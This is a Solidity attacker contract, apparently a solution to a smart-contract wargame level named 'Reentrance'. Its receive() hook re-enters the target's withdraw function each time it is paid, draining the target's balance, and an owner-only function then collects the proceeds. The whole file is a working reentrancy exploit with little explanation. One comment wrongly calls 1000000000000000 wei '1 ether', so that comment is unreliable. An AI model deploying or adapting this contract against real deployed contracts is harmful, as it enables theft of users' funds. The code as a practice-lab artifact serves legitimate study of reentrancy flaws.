// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {//Reentrance 컨트랙트를 사용하기 위한 interface 정의
    function withdraw(uint) external;
}

contract myContract {
  address public owner;
  Reentrance reentrance;//인스턴스
  
  constructor (address _target) {
      owner = msg.sender;
      reentrance = Reentrance(_target);//인스턴스에 주소 할당
  }
  
  function withdraw() public {//돈 회수 연습
      require(msg.sender == owner);
      msg.sender.call{value:address(this).balance}("");
  }
  
  function withdrawAll() public {
    reentrance.withdraw(1000000000000000);//1 ether withdraw
  }
  
  receive() external payable{//송금되면 수행
    reentrance.withdraw(1000000000000000);//1 ether withdraw
  }
}